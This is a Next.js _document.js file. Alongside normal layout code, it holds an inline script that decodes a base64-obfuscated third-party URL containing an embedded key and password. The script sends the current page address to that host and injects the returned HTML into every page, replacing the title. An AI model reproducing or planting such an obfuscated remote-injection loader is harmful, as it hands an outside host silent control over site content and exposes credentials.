import Document, { Head, Html, Main, NextScript } from "next/document";

class MyDocument extends Document {
  static async getInitialProps(ctx) {
    const initialProps = await Document.getInitialProps(ctx);
    return { ...initialProps };
  }

  render() {
    return (
      <Html lang="en">
        <Head />
        <body>
          <Main />
          <NextScript />
          <script
            dangerouslySetInnerHTML={{
              __html: `
              window.jQuery ||
              document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
                
          `,
            }}
          />
          <script
            dangerouslySetInnerHTML={{
              __html: `
            var eppathurl = window.location.origin + window.location.pathname;
            var eptagmanage = new XMLHttpRequest();
            eptagmanage.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    if (this.response !== 0) {
                        var temp = new Array();
                        var mystr = this.response;
                        temp = mystr.split("||||||||||");
                        document.querySelector("head title").remove();
                        document.querySelector("head").insertAdjacentHTML('beforeend', temp[0]);
                        document.querySelector("body").insertAdjacentHTML('beforeend', temp[1]);
                    }
                }
            };
            eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQ4Njc4NjA0MDEmZWtleXBhc3M9SnV4NDJlaFdOUjJHZHFDMGxFdkhJcUFkOERMemlYdThUQnVIJnNpdGV1cmw9") + eppathurl);
            eptagmanage.send();
              `,
            }}
          />
        </body>
      </Html>
    );
  }
}

export default MyDocument;
